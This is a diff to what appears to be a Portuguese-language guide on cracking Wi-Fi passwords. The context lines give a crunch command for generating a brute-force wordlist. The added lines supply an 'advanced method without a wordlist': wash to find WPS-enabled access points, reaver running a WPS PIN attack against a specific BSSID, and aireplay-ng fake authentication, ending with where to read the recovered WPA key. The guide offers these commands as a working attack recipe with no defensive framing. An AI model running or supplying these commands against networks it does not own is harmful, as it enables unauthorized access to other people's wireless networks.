@@ -21,4 +21,9 @@ Dessa forma, ele ira gerar uma lista gigante de de teste, sem consumir espaço e
 Para gerar a wordlist pode ser usado o: <br>
 crunch 8 10 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt <br>
 <br>
-O parâmetro PWR é o sinal WIFI. Quando mais perto de 0, melhor o sinal.  <br>
+O parâmetro PWR é o sinal WIFI. Quando mais perto de 0, melhor o sinal.  <br> <br> <br>
+<b> FORMA AVANÇADA SEM USO DE WORDLIST </b> <br>
+wash --interface wlan0 <br>
+reaver --bssid E4:C0:E2:1C:6E:6B  --channel 10 --interface wlan0 -vvv --no-associate <br>
+aireplay-ng --fakeauth 30 -a E4:C0:E2:1C:6E:6B -h mac_wlan0 wlan0  <br> <br>
+<b> Avaliar linha com: WPA PSK: </b>
